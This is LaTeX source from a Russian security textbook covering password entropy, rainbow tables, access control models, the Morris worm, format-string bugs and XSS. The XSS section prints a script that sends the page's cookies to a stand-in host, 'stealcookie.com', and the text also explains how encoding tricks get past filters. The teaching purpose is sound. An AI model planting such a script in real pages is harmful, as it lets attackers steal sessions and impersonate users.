Имея доступ к наиболее массовым интернет-сервисам с количеством пользователей десятки и сотни миллионов, в которых пароли часто хранятся в открытом виде из-за необходимости обновления ПО и, в частности, выполнения аутентификации, мы:
\begin{enumerate}
	\item имеем базу паролей, покрывающую существенную часть пользователей; 
	\item можем статистически построить правила генерирования паролей.
\end{enumerate}

Даже если пароль хранится в защищённом виде, то при вводе пароль, как правило, в открытом виде пересылается по Интернету, и все преобразования пароля для аутентификации осуществляет интернет-сервис, а не веб-браузер. Следовательно, интернет-сервис имеет доступ к исходному паролю.
\exampleend

В 2002 г. был подобран ключ для 64-битного блочного шифра RC5 сетью персональных компьютеров \texttt{distributed.net}, выполнявших вычисления в фоновом режиме. Суммарное время вычислений всех компьютеров -- 1757 дней, было проверено 83\% пространства всех ключей. Это означает, что пароли с оценочной энтропией менее 64 бит, то есть \emph{все пароли} до 40 символов по критериям NIST, могут быть подобраны в настоящее время. Конечно, с оговорками на то, что 1) нет ограничений на количество и частоту попыток аутентификаций, 2) алгоритм генерации вероятных паролей эффективен.

Строго говоря, использование даже 40-символьного пароля для аутентификации или в качестве ключа блочного шифрования является небезопасным.


\subsubsection{Число паролей}

Приведём различные оценки числа паролей, создаваемых людьми. Чаще всего такие пароли основаны на словах или закономерностях естественного языка. В английском языке всего около $1\ 000\ 000 \approx 2^{20}$ слов, включая термины.

%http://www.springerlink.com/content/bh216312577r6w64/fulltext.pdf
%http://www.antimoon.com/forum/2004/4797.htm

Используемые слоги английского языка имеют вид V, CV, VC, CVV, VCC, CVC, CCV, CVCC, CVCCC, CCVCC, CCCVCC, где C -- согласная (consonant), V -- гласная (vowel). 70\% слогов имеют структуру VC или CVC. Общее число слогов $S = 8000 \dots 12000$. Средняя длина слога -- 3 буквы.

Предполагая равновероятное распределение всех слогов английского языка, для числа паролей из $r$ слогов получим верхнюю оценку
    \[ N_1 = S^r = 2^{13 r} \approx 2^{4.3 L_1}. \]
Средняя длина паролей составит:
    \[ L_1 \approx 3 r. \]

Теперь предположим, что пароли могут состоять только из 2--3 буквенных слогов вида CV, VC, CVV, VCC, CVC, CCV с равновероятным распределением символов. Подсчитаем число паролей $N_2$, которые могут быть построены из $r$ таких слогов. В английском алфавите число гласных букв $n_v = 10, согласных n_c = 16, n = n_v + n_c = 26$. Верхняя оценка числа $r$-слоговых паролей:
    \[ N_2 = (n_c n_v + n_v n_c + n_c n_v n_v + n_v n_c n_c + n_c n_v n_c + n_c n_c n_v)^r \approx \]
        \[ \approx \left( n_c n_v(3 n_c + n_v) \right)^r, \]
    \[ N_2 \approx \left( \frac{n^3}{2} \right)^r \approx 2^{13 r} \approx 2^{4.3 L_2}. \]
Средняя длина паролей:
    \[ L_2 = \frac{n_c n_v(2 + 2 + 3 n_v + 3 n_c + 3 n_c + 3 n_c)}{n_c n_v (1 + 1 + n_v + n_c + n_c + n_c)} \cdot r \approx 3 r. \]

Как видно, в обоих предположениях получились одинаковые оценки для числа и длины паролей.

Подсчитаем верхние оценки числа паролей из $L$ символов, предполагая равномерное распределение символов из алфавита мощностью $D$ символов: a) $D_1 = 26$ строчных букв, б) все $D_2 = 94$ печатных символа клавиатуры (латиница и небуквенные символы):
    \[ N_3 = D_1^L \approx 2^{4.7 L}, \]
    \[ N_4 = D_2^L \approx 2^{6.6 L}. \]

\begin{table}[!ht]
    \caption{Различные верхние оценки числа паролей\label{tab:password-number}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c|}
        \hline
        \multirow{2}{*}{\parbox{1.5cm}{\medskip\medspace \centering Длина пароля}} & \multicolumn{3}{|c|}{Число паролей} \\
        \cline{2-4}
            & \parbox{3.5cm}{\medspace \centering На основе слоговой композиции} &
            \parbox{3cm}{\medspace\centering Алфавит $D=26$ символов} &
            \parbox{3cm}{\medspace \centering Алфавит $D=94$ символа} \\
        \hline
        \rule{0pt}{2.5ex}$6$  & $2^{26}$ & $2^{28}$ & $2^{39}$ \\
        9  & $2^{39}$ & $2^{42}$ & $2^{59}$ \\
        12 & $2^{52}$ & $2^{56}$ & $2^{79}$ \\
        15 & $2^{65}$ & $2^{71}$ & $2^{98}$ \\
        \hline
        \rule{0pt}{2.5ex} 21 & $2^{91}$ & $2^{99}$ & $2^{137}$ \\
        \hline
        \rule{0pt}{2.5ex} 39 & $2^{169}$ & $2^{183}$ & $2^{256}$ \\
        \hline
    \end{tabular} }
\end{table}

Из таблицы~\ref{tab:password-number} видно, что при доступном объёме вычислений в $2^{60}$\,--\,$2^{70}$ операций, пароли вплоть до 15-ти символов, построенные на словах, слогах, изменениях слов, вставках цифр, небольшом изменении регистров и других простейших модификациях, в настоящее время могут быть найдены полным перебором как на вычислительном кластере, так и на персональном компьютере.

Для достижения криптостойкости паролей, сравнимой со 128- или 256-битовым секретным ключом, требуется выбирать пароль из 20 и 40 символов соответственно, что, как правило, не реализуется из-за сложности запоминания и возможных ошибок при вводе.


%Подсчитаем число паролей $N_1$, которые могут могут построены из $r$ ~ 2-3 буквенных слогов: $cv, vc, ccv, cvc, vcc$, где $c$ -- согласная, $v$ -- гласная. В английском алфавите $n_v = 10, n_c = 16, n = n_v + n_c = 26$. Число паролей
%    \[ N_1 = \left( n_v n_c (1 + 1 + n_c + n_c + n_c) \right)^r \approx 3^r n_v^r n_c^{2r}. \]
%Средняя длина паролей
%    \[ L = r \left( \frac{2 + 2 + 3 n_c + 3 n_c + 3 n_c}{1 + 1 + n_c + n_c + n_c} \right) \approx 3r. \]
%
%%Учтем, что $b \leq r$ символов могут быть заглавными: $N_1 \rightarrow N_2 < N_1 \binom{L}{b} \left( \frac{n}{n_v} \right)^b$. Вставим $d$ цифр в случайные места: $N_2 \rightarrow N_3 = N_2 (10 (1 + L))^d \approx N_2 (10 L)^d$.
%%
%%Общее число паролей
%%    \[ N = N_3 = 3^r 10^r 16^{2r} \binom{3r}{b} 2.6^b \left(10 \cdot 3 r \right)^d. \]
%%
%%\begin{table}[!ht]
%%    \centering
%%    \small
%%    \begin{tabular}{|c|c|c|c|c||cr|}
%%        \hline
%%        \parbox{1.3cm}{Слогов, $r$} & \parbox{1.8cm}{Заглавных букв, $b$} & \parbox{1.5cm}{Вставок цифр, $d$} & \parbox{2.8cm}{Средняя длина пароля, $L+d$} & \parbox{3cm}{Верхняя оценка числа паролей $N$} & \multicolumn{2}{|c|}{\parbox{3.2cm}{Число всех паролей}} \\
%%        \hline
%%        $2$ & $0$ & $0$ & $6$ & $2^{26}$ & $2^{36}$ & a-z \\
%%        $2$ & $2$ & $0$ & $6$ & $2^{32}$ & $2^{48}$ & A-Z, a-z \\
%%        $2$ & $2$ & $2$ & $8$ & $2^{45}$ & $2^{48}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%        $3$ & $0$ & $0$ & $9$ & $2^{39}$ & $2^{54}$ & a-z \\
%%        $3$ & $3$ & $0$ & $9$ & $2^{49}$ & $2^{54}$ & A-Z, a-z \\
%%        $3$ & $3$ & $2$ & $11$ & $2^{63}$ & $2^{65}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%        $4$ & $0$ & $0$ & $12$ & $2^{52}$ & $2^{93}$ & a-z \\
%%        $4$ & $3$ & $0$ & $12$ & $2^{64}$ & $2^{186}$ & A-Z, a-z \\
%%        $4$ & $3$ & $2$ & $14$ & $2^{78}$ & $2^{222}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%    \end{tabular}
%%    \caption{Сравнение верхней оценки числа паролей, построенных на слогах, со всем доступным множеством паролей.}
%%    \label{tab:password-number}
%%\end{table}
%
%Учтем, что $b$ символов в пароле могут быть взяты не из 26-символьного алфавита строчных букв, а из всего алфавита в $D=94$ печатных символа клавиатуры (латиница и небуквенные символы):
%\[
%    \begin{array}{ll}
%    b=1 & N_1 \rightarrow N_2 = \frac{n_v}{n_v+n_c} 3^r n_v^{r-1} n_c^{2r} \cdot L. \]
%
%    \[ N_1 \rightarrow N_2 < N_1 \binom{L}{b} \left( \frac{D}{n_v} \right)^b. \]
%
%
%
%Общее число паролей
%    \[ N < 3^r n_v^r n_c^{2r} \binom{L}{b} \left( \frac{D}{n_v} \right)^b = 3^r 10^r 16^{2r} \binom{3r}{b} \left( \frac{94}{10} \right)^b. \]
%
%\begin{table}[!ht]
%    \centering
%    \small
%    \begin{tabular}{|c|c|c|c||cr|}
%        \hline
%        \parbox{1.5cm}{Слогов, $r$} & \parbox{3cm}{Средняя длина пароля, $L$} & \parbox{3cm}{Символов из всего алфавита, $b$} & \parbox{3cm}{Верхняя оценка числа паролей $N$} & \multicolumn{2}{|c|}{\parbox{3.2cm}{Число всех паролей, $D^L$}} \\
%        \hline
%        \multirow{3}{*}{2} & \multirow{3}{*}{6} & $0$ & $2^{26}$ & $2^{28}$ & a-z \\
%        & & $1$ & $2^{32}$ & $2^{34}$ & A-Z, a-z \\
%        & & $3$ & $2^{40}$ & $2^{39}$ & Весь алфавит \\
%        \hline
%        \multirow{3}{*}{3} & \multirow{3}{*}{9} & $0$ & $2^{39}$ & $2^{42}$ & a-z \\
%        & & $2$ & $2^{50}$ & $2^{51}$ & A-Z, a-z \\
%        & & $4$ & $2^{59}$ & $2^{59}$ & Весь алфавит \\
%        \hline
%        \multirow{3}{*}{4} & \multirow{3}{*}{12} & $0$ & $2^{52}$ & $2^{56}$ & a-z \\
%        & & $3$ & $2^{69}$ & $2^{68}$ & A-Z, a-z \\
%        & & $6$ & $2^{81}$ & $2^{77}$ & Весь алфавит \\
%        \hline
%    \end{tabular}
%    \caption{Сравнение верхней оценки числа паролей, построенных на слогах, со всем доступным множеством паролей в алфавите из $D$ символов.}
%    \label{tab:password-number}
%\end{table}
%
%Из таблицы~\ref{tab:password-number} видно, что при доступном объёме вычислений в $2^{60 \ldots 70}$ операций, пароли вплоть до 12 символов, построенные на словах, слогах, изменениях слов, вставках цифр, небольшого изменения регистров и другой простейшей обфускации, могут быть найдены перебором на кластере (или ПК) в настоящее время.


\subsubsection{Атака для подбора паролей и ключей шифрования}

В схемах аутентификации по паролю иногда используется хэширование и хранение хэша пароля на сервере. В таких случаях применима словарная атака или атака с применением заранее вычисленных таблиц для ускорения поиска.

Для нахождения пароля, прообраза хэш-функции, или для нахождения ключа блочного шифрования по атаке с выбранным шифртекстом (для одного и того же известного открытого текста и соответствующего шифртекста) может быть применён метод перебора с балансом между памятью и временем вычислений. Самый быстрый метод радужных таблиц\index{радужные таблицы} (\langen{rainbow tables}, 2003~г., \cite{Oechslin:2003}) заранее вычисляет следующие цепочки и хранит результат в памяти.

Для нахождения пароля, прообраза хэш-функции $H$, цепочка строится как
    \[ M_0 \xrightarrow{H(M_0)} h_0 \xrightarrow{R_0(h_0)} M_1 \ldots M_t \xrightarrow{H(M_t)} h_t \xrightarrow{R_t(h_t)} M_{t+1}, \]
где $R_i(h)$ -- функция редуцирования, преобразования хэша в пароль для следующего хэширования.

Для нахождения ключа блочного шифрования для одного и того же известного открытого текста $M$ таблица строится как
    \[ K_0 \xrightarrow{E_{K_0}(M)} c_0 \xrightarrow{R_0(c_0)} K_1 \ldots K_t \xrightarrow{E_{K_t}(M)} c_t \xrightarrow{R_t(c_t)} K_{t+1}, \]
где $R_i(c)$ -- функция редуцирования, преобразования шифртекста в новый ключ.

Функция редуцирования $R_i$ зависит от номера итерации, чтобы избежать дублирующихся подцепочек, которые возникают в случае коллизий между значениями в разных цепочках в разных итерациях, если $R$ постоянна. Радужная таблица размера $(m \times 2)$ состоит из строк $(M_{0,j}, M_{t+1,j})$ или $(K_{0,j}, K_{t+1,j})$, вычисленных для разных значений стартовых паролей $M_{0,j}$ или $K_{0,j}$ соответственно.

Опишем атаку на примере нахождения прообраза $\overline{M}$ хэша $\overline{h} = H(\overline{M})$. На первой итерации исходный хэш $\overline{h}$ редуцируется в сообщение $\overline{h} \xrightarrow{R_t(\overline{h})} \overline{M}_{t+1} $ и сравнивается со всеми значениями последнего столбца $M_{t+1,j}$ таблицы. Если нет совпадения, переходим ко второй итерации. Хэш $\overline{h}$ дважды редуцируется в сообщение $\overline{h} \xrightarrow{R_{t-1}(\overline{h})} \overline{M}_t \xrightarrow{H(\overline{M}_t)} \overline{h}_t \xrightarrow{R_t(\overline{h}_t)} \overline{M}_{t+1}$ и сравнивается со всеми значениями последнего столбца $M_{t+1,j}$ таблицы. Если не совпало, то переходим к третьей итерации и~т.\,д. Если для $r$-кратного редуцирования сообщение $\overline{M}_{t+1}$ содержится в таблице во втором столбце, то из совпавшей строки берётся $M_{0,j}$, и вся цепочка пробегается заново для поиска искомого сообщения $\overline{M}: ~ \overline{h} = H(\overline{M})$.

Найдём вероятность нахождения пароля в таблице. Пусть мощность множества всех паролей равна $N$. Изначально в столбце $M_{0,j}$ содержится $m_0 = m$ различных паролей. Предполагая наличие случайного отображения с пересечениями паролей $M_{0,j} \rightarrow M_{1,j}$, в $M_{1,j}$ будет $m_1$ различных паролей. Согласно задаче о размещении,
\[
    m_{i+1} = N \left( 1 - \left( 1 - \frac{1}{N} \right)^{m_i} \right) \approx N \left( 1 - e^{-\frac{m_i}{N}} \right).
\]
Вероятность нахождения пароля:
\[
    P = 1 - \prod \limits_{i=1}^t \left( 1 - \frac{m_i}{N} \right).
\]

Чем больше таблица из $m$ строк, тем больше шансов найти пароль или ключ, выполнив в наихудшем случае   $O \left( m \frac{t(t+1)}{2} \right)$ операций.

Примеры применения атаки на хэш-функциях $\textrm{MD5}$\index{хэш-функция!MD5}, $\textrm{LM} \sim \textrm{DES}_{\textrm{Password}} (\textrm{const})$ приведены в таблице~\ref{tab:rainbow-tables}.

\begin{table}[!ht]
    \centering
    \caption{Атаки на радужных таблицах на \emph{одном} ПК\label{tab:rainbow-tables}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c|c|c|c|c|c|c|}
        \hline
        \multirow{2}{*}{\parbox{1.0cm}{\medskip\medskip \centering Длина, биты}} & \multicolumn{3}{|c|}{\parbox{4.3cm}{\medspace\centering Пароль или ключ}} &
            \multicolumn{3}{|c|}{\parbox{4.33cm}{\medspace\centering Радужная таблица}} \\
        \cline{2-7}
        & \parbox{1.0cm}{\centering Длина,\\ симв.} & \parbox{1.7cm}{\centering Множество} & \parbox{1.7cm}{\centering Мощность} &
            \parbox{1cm}{\centering Объём} & \parbox{2.23cm}{\medspace \centering Время вычисления таблиц} & \parbox{1.1cm}{\centering Время поиска} \\
        \hline \hline
        \multicolumn{7}{|c|}{Хэш LM} \\
        \hline
        \rule{0pt}{2.5ex}\multirow{3}{*}{$2 \times 56$} & \multirow{3}{*}{14} &
            A--Z & $2^{33}$ & 610 MB &  & 6 с \\
        & & A--Z, 0-9 & $2^{36}$ & 3 GB &  & 15 с \\
        & & все & $2^{43}$ & 64 GB & \parbox{2.23cm}{несколько лет} & 7 мин \\
        \hline \hline
        \multicolumn{7}{|c|}{Хэш MD5} \\
        \hline
        \rule{0pt}{2.5ex} 128 & 8 & A-Z, 0-9 & $2^{41}$ & 36 GiB & - & 4 мин \\
        \hline
    \end{tabular} }
\end{table}

\section{Аутентификация по паролю}

Из-за малой энтропии пользовательских паролей во всех системах регистрации и аутентификации пользователей применяется специальная политика безопасности. Типичные минимальные требования:
\begin{enumerate}
    \item Длина пароля от 8 символов. Использование разных регистров и небуквенных символов в паролях. Запрет паролей из словаря или часто используемых паролей. Запрет паролей в виде дат, номеров машин и других номеров.
    \item Ограниченное время действия пароля. Обязательная смена пароля по истечении срока действия.
    \item Блокирование возможности аутентификации после нескольких неудачных попыток. Ограниченное число актов аутентификации в единицу времени. Временная задержка перед выдачей результата аутентификации.
\end{enumerate}

Дополнительные меры предосторожности для пользователей:
\begin{enumerate}
    \item Не использовать одинаковые или похожие пароли для разных систем, таких как электронная почта, вход в ОС, электронная платёжная система, форумы, социальные сети. Пароль часто передаётся в открытом виде по сети. Пароль доступен администратору системы, возможны утечки конфиденциальной информации с серверов. Поэтому следует стараться выбирать случайные стойкие пароли.
    \item Не записывать пароли. Никому не сообщать пароль, даже администратору. Не передавать пароли по почте, телефону, Интернету и~т.\,д.
    \item Не использовать одну и ту же учётную запись для разных пользователей, даже в виде исключения.
    \item Всегда блокировать компьютер, когда пользователь отлучается от него, даже на короткое время.
\end{enumerate}

\input{os_passwords}

\input{http_auth}

\chapter{Программные уязвимости}

\section[Контроль доступа в ИС]{Контроль доступа в \protect\\ информационных системах}
\selectlanguage{russian}

%http://www.acsac.org/2005/papers/Bell.pdf
%http://www.dranger.com/iwsec06_co.pdf
%http://csrc.nist.gov/groups/SNS/rbac/documents/design_implementation/Intro_role_based_access.htm
%http://en.wikipedia.org/wiki/Access_control#Computer_security
%http://en.wikipedia.org/wiki/Discretionary_access_control
%http://en.wikipedia.org/wiki/Mandatory_access_control
%http://en.wikipedia.org/wiki/Role-Based_Access_Control

В информационных системах контроль доступа вводится над \emph{действия} \emph{субъектов} над \emph{объектами}. В операционных системах под субъектами почти всегда понимаются процессы, под объектами -- процессы, разделяемая память, объекты файловой системы, порты ввода-вывода и~т.\,д., под действием -- чтение (файла или содержимого директории), запись (создание, добавление, изменение, удаление, переименование файла или директории) и исполнение (файла-программы). Система контроля доступа в информационной системе (операционной системе, базе данных и~т.\,д.) определяет множество субъектов, объектов и действий.

Применение контроля доступа создаётся:

\begin{enumerate}
	\item \emph{аутентификацией} субъектов и объектов,
	\item \emph{авторизацией} допустимости действия,
	\item \emph{аудитом} (проверкой и хранением) ранее совершённых действий.
\end{enumerate}

Различают три основные модели контроля доступа: дискреционная\index{управление доступом!дискреционное} (\langen{discretionary access control, DAC}), мандатная\index{управление доступом!мандатное} (\langen{mandatory access control, MAC}) и ролевая\index{управление доступом!ролевое} (\langen{role-based access control, RBAC}). Современные операционные системы используют \emph{комбинации} двух или трёх моделей доступа, причём решения о доступе принимаются в порядке убывания приоритета: ролевая, мандатная, дискреционная модели.

Системы контроля доступа и защиты информации в операционных системах используются не только для защиты от злоумышленника, но и для повышения устойчивости системы в целом. Однако появление новых механизмов в новых версиях ОС может привести к проблемам совместимости с уже существующим программным обеспечением.

\subsection{Дискреционная модель}

Классическое определение из так называемой Оранжевой книги (\langen{``Trusted Computer System Evaluation Criteria''}, устаревший стандарт министерства обороны США 5200.28-STD, 1985 г.~\cite{DOD-5200.28-STD}) следующее: дискреционная модель\index{контроль доступа!дискреционный} -- средства ограничения доступа к объектам, основанные на сущности (\langen{identity}) субъекта и/или группы, к которой они принадлежат. Субъект, имеющий определённый доступ к объекту, обладает возможностью полностью или частично передать право доступа другому субъекту.

На практике дискреционная модель доступа предполагает, что для каждого объекта в системе определён субъект-владелец. Этот субъект может самостоятельно устанавливать необходимые, по его мнению, права доступа к любому из своих объектов для остальных субъектов, в том числе и для себя самого. Логически владелец объекта является владельцем информации, находящейся в этом объекте. При доступе некоторого субъекта к какому-либо объекту система контроля доступа лишь считывает установленные для объекта права доступа и сравнивает их с правами доступа субъекта. Кроме того, предполагается наличие в ОС некоторого выделенного субъекта -- администратора дискреционного управления доступом, который имеет привилегию устанавливать дискреционные права доступа для любых, даже ему не принадлежащих объектов в системе.

Дискреционную модель реализуют почти все популярные ОС, в частности Windows и Unix. У каждого объекта (файла, процесса и~т.\,д.) есть субъект-владелец (пользователь, группа пользователей или система), который может делегировать доступ к объекту другим субъектам, изменяя атрибуты на чтение и запись файлов. Администратор системы обычно имеет возможность поменять владельца любого объекта и любые атрибуты безопасности.

\subsection{Мандатная модель}

Приведем классическое определение мандатной модели\index{контроль доступа!мандатный} из Оранжевой книги. \emph{Мандатная модель} контроля доступа -- это модель, в которой используются средства ограничения доступа к объектам, основанные на важности (секретности) информации, содержащейся в объектах, и обязательная авторизация действий субъектов для доступа к информации с присвоенным уровнем важности. Важность информации определяется уровнем доступа, приписываемым всем объектам и субъектам. Исторически мандатная модель определяла важность информации в виде иерархии, например совершенно секретно (СС), секретно (С), конфиденциально (К) и рассекречено (Р). При этом верно следующее: СС $\supset$ C $\supset$ K $\supset$ P, то есть каждый уровень включает сам себя и все уровни, находящиеся ниже в иерархии.

Современное определение мандатной модели -- применение явно указанных правил доступа субъектов к объектам, определяемых только администратором системы. Сами субъекты (пользователи) не имеют возможности для изменения прав доступа. Правила доступа описаны матрицей, в которой столбцы соответствуют субъектам, строки -- объектам, а в ячейках содержатся допустимые действия субъекта над объектом. Матрица покрывает всё пространство субъектов и объектов. Также определены правила наследования доступа для новых создаваемых объектов. В мандатной модели матрица может быть изменена только администратором системы.

Модель Белла --- Ла Падулы\index{модель!Белла --- Ла Падулы} (\langen{Bell --- LaPadula Model},~\cite{Bell:LaPadula:1973, Bell:LaPadula:1976}) использует два мандатных и одно дискреционное правила политики безопасности.
\begin{enumerate}
    \item Субъект с определённым уровнем секретности не может иметь доступ на \emph{чтение} объектов с более \emph{высоким} уровнем секретности (\langen{no read-up}).
    \item Субъект с определённым уровнем секретности не может иметь доступ на \emph{запись} объектов с более \emph{низким} уровнем секретности (\langen{no write-down}).
    \item Использование матрицы доступа субъектов к объектам для описания дискреционного доступа.
\end{enumerate}

\subsection{Ролевая модель}

Ролевая модель доступа основана на определении ролей в системе\index{контроль доступа!ролевой}. Понятие <<роль>> в этой модели -- это совокупность действий и обязанностей, связанных с определённым видом деятельности. Таким образом, достаточно указать тип доступа к объектам для определённой роли и определить группу субъектов, для которых она действует.
Одна и та же роль может использоваться несколькими различными субъектами (пользователями). В некоторых системах пользователю разрешается выполнять несколько ролей одновременно, в других есть ограничение на одну или несколько непротиворечащих друг другу ролей в каждый момент времени.

Ролевая модель, в отличие от дискреционной и мандатной, позволяет реализовать разграничение полномочий пользователей, в частности, на системного администратора и офицера безопасности, что повышает защиту от человеческого фактора.


\input{os_access_controls}

\section{Виды программных уязвимостей}

\emph{Вирусом} называется самовоспроизводящаяся часть кода (подпрограмма)\index{вирус}, которая встраивается в носители (другие программы) для своего исполнения и распространения. Вирус не может исполняться и передаваться без своего носителя.

\emph{Червём} называется самовоспроизводящаяся отдельная (под)программа\index{червь}, которая может исполняться и распространяться самостоятельно, не используя программу-носитель.

Первой вехой в изучении компьютерных вирусов можно назвать 1949 год, когда Джон фон Нейман прочёл курс лекций в Университете Иллинойса под названием <<Теория самовоспроизводящихся машин>> (изданы в 1966~\cite{Neumann:1966}, переведены на русский язык издательством <<Мир>> в 1971 году~\cite{Neumann:1971}), в котором ввёл понятие самовоспроизводящихся механических машин. Первым сетевым вирусом считается вирус Creeper 1971 г., распространявшийся в сети ARPANET, предшественнице Интернета. Для его уничтожения был создан первый антивирус Reaper, который находил и уничтожал Creeper.

Первый червь для Интернета, червь Морриса, 1988 г., уже использовал \emph{смешанные} атаки\index{атака!смешанная} для заражения UNIX машин~\cite{EichinRochlis:1988, Spafford:1989}. Сначала программа получала доступ к удалённому запуску команд, эксплуатируя уязвимости в сервисах \texttt{sendmail}, \texttt{finger} (с использованием атаки на переполнение буфера) или \texttt{rsh}. Далее, с помощью механизма подбора паролей червь получал доступ к локальным аккаунтам пользователей:
\begin{itemize}
    \item получение доступа к учётным записям с очевидными паролями:
		\begin{itemize}
			\item без пароля вообще;
			\item имя аккаунта в качестве пароля;
			\item имя аккаунта в качестве пароля, повторённое дважды;
			\item использование <<ника>> (\langen{nickname});
			\item фамилия (\langen{last name, family name});
			\item фамилия, записанная задом наперёд;
		\end{itemize}
		\item перебор паролей на основе встроенного словаря из 432 слов;
		\item перебор паролей на основе системного словаря \texttt{/usr/dict/words}.
\end{itemize}

\emph{Программной уязвимостью}\index{программная уязвимость} называется свойство программы, позволяющее нарушить её работу. Программные уязвимости могут приводить к отказу в обслуживании (Denial of Service, DoS-атака)\index{атака!отказ в обслуживании}, утечке и изменению данных, появлению и распространению вирусов и червей.

Одной из распространённых атак для заражения персональных компьютеров является переполнение буфера в стеке. В интернет-сервисах наиболее распространённой программной уязвимостью в настоящее время является межсайтовый скриптинг (Cross-Site Scripting, XSS-атака)\index{атака!XSS}.

Наиболее распространённые программные уязвимости можно разделить на классы:
\begin{enumerate}
    \item Переполнение буфера -- копирование в буфер данных большего размера, чем длина выделенного буфера. Буфером может быть контейнер текстовой строки, массив, динамически выделяемая память и~т.\,д. Переполнение становится возможным вследствие либо отсутствия контроля над длиной копируемых данных, либо из-за ошибок в коде. Типичная ошибка -- разница в 1 байт между размерами буфера и данных при сравнении.
    \item Некорректная обработка (парсинг) данных, введённых пользователем, является причиной большинства программных уязвимостей в веб-приложениях. Под обработкой понимаются:
        \begin{enumerate}
            \item проверка на допустимые значения и тип (числовые поля не должны содержать строки и~т.\,д.);
            \item фильтрация и экранирование специальных символов, имеющих значения в скриптовых языках или применяющихся для перекодирования из одной текстовой кодировки в другую. Примеры символов: \texttt{\textbackslash}, \texttt{\%}, \texttt{<}, \texttt{>}, \texttt{"}, \texttt{'};
            \item фильтрация ключевых слов языков разметки и скриптов. Примеры: \texttt{script}, \texttt{JavaScript};
            \item перекодирование различными кодировками при парсинге. Распространённый способ обхода системы контроля парсинга данных состоит в однократном или множественном последовательном кодировании текстовых данных в шестнадцатеричные кодировки \texttt{\%NN} ASCII и UTF-8. Например, браузер или веб-приложения производят $n$-кратное перекодирование, в то время как система контроля делает $k$-кратное перекодирование, $0 \leq k < n$, и, следовательно, пропускает закодированные запрещённые символы и слова.
        \end{enumerate}
    \item Некорректное использование функций. Например, \texttt{printf(s)} может привести к уязвимости записи в память по указанному адресу. Если злоумышленник вместо обычной текстовой строки введёт в качестве \texttt{s "текст некоторой длины\%n"}, то функция \texttt{printf}, ожидающая первым аргументом строку формата \texttt{fmt}, обнаружив \texttt{\%n}, возьмёт значение из ячеек памяти, находящихся перед ячейками с указателем на текстовую строку (устройство стека описано далее), и запишет в память по адресу, равному считанному значению, количество выведенных символов на печать функцией \texttt{printf}.
\end{enumerate}


\input{stack_overflow}

\section{Межсайтовый скриптинг}\index{атака!XSS}
\selectlanguage{russian}

Другой вид распространённых программных уязвимостей состоит в некорректной обработке данных, введённых пользователем. Типичные примеры: отсутствующее или неправильное экранирование специальных символов и полей (спецсимволы \texttt{<} и \texttt{>} HTML, кавычки, слэши \texttt{/}, \texttt{\textbackslash}) и отсутствующая или неправильная проверка введённых данных на допустимые значения (SQL-запрос к базе данных веб-ресурса вместо логина пользователя).

Межсайтовый скриптинг (\langen{Cross-Site Scripting, XSS}) заключается во внедрении в веб-страницу злоумышленником $A$ исполняемого текстового скрипта, который будет исполнен браузером клиента $B$. Скрипт может быть написан на языках JavaScript, VBScript, ActiveX, HTML, Flash. Целью атаки является, как правило, доступ к информации клиента.

Скрипт может получить доступ к cookie-файлам данного сайта, например с аутентификатором, вставить гиперссылки на свой сайт под видом доверенных ссылок. Вставленные гиперссылки могут содержать информацию пользователя.

Скрипт также может выполнить последовательность HTTP GET- и POST-запросов на веб-сайт для выполнения действий от имени пользователя. Например вирусно распространить вредоносный JavaScript код со страницы одного пользователя на страницы всех друзей, друзей друзей и~т.\,д., а затем удалить все данные пользователя. Атака может привести к уничтожению социальной сети.

Приведём пример кражи cookie-файла веб-сайта, который имеет уязвимость на вставку текста, содержащего исполняемый браузером код.

%Когда браузер первый раз обращается к сайту, веб-приложение может выслать вместе с HTML страницей cookie-файл, хранящий текстовую строку последовательностей

Пусть аутентификатор пользователя в cookie-файле сайта \texttt{myemail.com} содержит
\begin{center} \begin{verbatim}
auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

Пусть текстовое сообщение, размещённое пользователем, содержит скрипт, помещающий на странице <<изображение>>, расположенное по некоему адресу
\begin{verbatim}
<script>
  new Image().src = "http://stealcookie.com?c=" +
    encodeURI(document.cookie);
</script>
\end{verbatim}

Тогда браузеры всех пользователей, которым показывается сообщение, при загрузке страницы отправят HTTP GET-запрос на получение файла <<изображения>> по адресу
\begin{center} \begin{verbatim}
http://stealcookie.com?auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

В результате злоумышленник получит cookie, используя который он сможет заходить на веб-сайт под видом пользователя.

Вставка гиперссылок является наиболее частой XSS-атакой. Иногда ссылки кодируются шестнадцатеричными числами вида \texttt{\%NN}, чтобы не вызывать сомнения у пользователя текстом ссылки.
%Браузер самостоятельно не может отослать данные на другой сайт, отличный от текущего, поэтому передаваемая информация содержится в гиперссылках.

%(например, JavaScript код), либо программным обеспечением, генерирующим HTML-страницу для выдачи клиенту $B$ (например, PHP код). Цель XSS атаки -- либо выполнение JavaScript кода браузером клиента, либо выполнение скриптового кода на веб-сервере при запросе клиента к нему.

%Простой пример -- веб-форум. Пользователи вводят в формы текстовые сообщения, которые запоминаются в БД и показываются другим пользователям. Страница форума генерируется каждый раз заново при запросе пользователей информационной системой. Генерирование часто происходит из шаблона страницы, который содержит и базовый статический HTML код страницы, и исполняемый код скрипта для вставки динамического содержания на основе запроса к базе данных. Как правило, злоумышленник пользуется во время генерирования страницы некорректным экранированием текста, введённого им в формах ввода текста веб-страницы, кавычек, слэшей. То есть, текстовые значения полей, которые сохраняются в базе данных веб-сайта и отображаются другим пользователям, содержат исполняемый код злоумышленника.

На 2009 г. 80\% обнаруженных уязвимостей веб-сайтов являются XSS-уязвимостями.

Стандартный способ защиты от XSS-атак заключается в фильтрации, замене, экранировании символов и слов введённого пользователем текста: \texttt{<}, \texttt{>}, \texttt{/}, \texttt{\textbackslash}, \texttt{"}, \texttt{'}, \texttt{(}, \texttt{)}, \texttt{script}, \texttt{javascript} и~др., а также в обработке кодировок символов.


\input{sql-injections}

%\chapter{Послесловие}
%Это должно быть что-то в виде заключения, объяснения, почему именно эти темы выбраны, насколько актуален материал с теоретической и практической точки зрения.


\appendix
\renewcommand{\thechapter}{\Asbuk{chapter}} % использование русских букв для нумерации приложений

\chapter{Математическое приложение}\label{chap:discrete-math}

\section{Общие определения}

